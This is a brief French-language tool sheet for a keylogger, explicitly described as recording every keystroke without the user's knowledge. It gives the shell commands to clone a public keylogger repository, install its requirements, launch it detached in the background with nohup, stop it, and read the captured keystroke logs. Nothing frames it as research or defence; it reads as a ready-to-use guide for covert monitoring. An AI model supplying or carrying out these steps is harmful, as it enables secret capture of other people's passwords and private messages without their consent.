# Outils : Keylogger

## Description

Enregistre chaque frappes du clavier à l'insu de l'utilisateur.

## 1. Cloner le dépôt

```bash
git clone https://github.com/GiacomoLaw/Keylogger
```

## 2. Installer les dépendances

```bash
cd Keylogger/linux
pip3 install -r requirements.txt
```

## 3. Exécuter

```bash
nohup python3 keylogger.py &
```

## 4. Arrêter le processus

```bash
fg
CTRL+C
```

ou

```bash
# trouver le PID du processus
ps

# le terminer
kill [PID]
```

## 4. Voir les logs des frappes

```bash
cat XX-XX-XXXX|XX:XX.log
```
